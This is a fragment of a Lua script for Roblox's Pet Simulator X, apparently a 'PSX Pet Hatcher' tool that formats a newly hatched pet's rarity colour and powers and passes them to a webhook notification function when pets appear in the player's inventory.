				local Color = (Rarity == 'Mythical' and "ff8c00") or (Rarity == 'Legendary' and "ff45f6") or (Rarity == 'Epic' and "ffea47") or (Rarity == 'Rare' and "42ff5e") or (Rarity == 'Basic' and "b0b0b0") or (Rarity == 'Exclusive' and "d06bff")
				local NewPowers = {}
				for a,b in pairs(Powers) do
					local eeeeeeee = tostring(b[1] .. " " .. b[2])
					table.insert(NewPowers, eeeeeeee)
				end
                if dontsend == false then
				Send(Name, Nickname, Library.Functions.Commas(Strength), Rarity, Thumbnail, Formation, Color, NewPowers, nth, Hatchping, chance, PetName, FooterRarity, NewColor)
			end
			end
		end
	end
    
    
	if _G.Connection then _G.Connection:Disconnect() end
	_G.Connection = game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets.ChildAdded:Connect(function(child)
		SendWebhook(child.Name)
	end)
end
print('PSX Pet Hatcher V2.6.3, Maintained and Updated by A&J Gaming#1569')
